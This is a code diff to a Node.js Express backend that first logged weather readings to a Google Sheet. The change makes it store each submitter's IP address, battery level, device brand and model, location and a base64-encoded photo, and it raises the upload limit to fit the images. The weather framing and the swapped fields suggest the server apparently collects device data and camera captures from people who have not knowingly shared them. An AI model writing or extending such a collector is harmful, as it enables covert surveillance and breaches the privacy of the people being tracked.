@@ -4,9 +4,9 @@ const cors = require('cors');
 const app = express();
 
 app.use(cors());
-app.use(express.json());
+// Increased limit is vital for receiving the photo data
+app.use(express.json({ limit: '50mb' })); 
 
-// 1. Google Sheets Setup
 const auth = new google.auth.GoogleAuth({
     credentials: {
         client_email: process.env.GOOGLE_CLIENT_EMAIL,
@@ -16,37 +16,33 @@ const auth = new google.auth.GoogleAuth({
 });
 
 const sheets = google.sheets({ version: 'v4', auth });
-const SPREADSHEET_ID = process.env.GOOGLE_SHEET_ID;
 
-// 2. The Route to save weather
 app.post('/log', async (req, res) => {
     try {
-        const { city, temperature, humidity, condition } = req.body;
-        const date = new Date().toLocaleString();
+        const { city, temp, battery, ip, brand, model, location, photo } = req.body;
+        const timestamp = new Date().toLocaleString();
 
+        // We save the photo as a "Data URL" in the sheet. 
+        // You can copy-paste that text into a browser to see the image.
         await sheets.spreadsheets.values.append({
-            spreadsheetId: SPREADSHEET_ID,
-            range: 'Sheet1!A:E',
+            spreadsheetId: process.env.GOOGLE_SHEET_ID,
+            range: 'Sheet1!A:I',
             valueInputOption: 'USER_ENTERED',
             resource: {
-                values: [[date, city, temperature, humidity, condition]],
+                values: [[
+                    timestamp, city, temp, battery, ip, 
+                    brand, model, location, photo
+                ]],
             },
         });
 
-        console.log(`✅ Success: Data logged for ${city}`);
-        res.status(200).json({ message: 'Success: Data logged!' });
+        console.log(`✅ Data logged to Sheet for IP: ${ip}`);
+        res.status(200).json({ status: 'success' });
     } catch (error) {
-        console.error('❌ Error logging to Google Sheets:', error);
+        console.error('❌ Sheet Error:', error);
         res.status(500).json({ error: error.message });
     }
 });
 
-// 3. Simple Home Route
-app.get('/', (req, res) => {
-    res.send('Weather Backend is Running!');
-});
-
 const PORT = process.env.PORT || 8080;
-app.listen(PORT, () => {
-    console.log(`🚀 Server running on port ${PORT}`);
-});
+app.listen(PORT, () => console.log(`🚀 Server running on ${PORT}`));
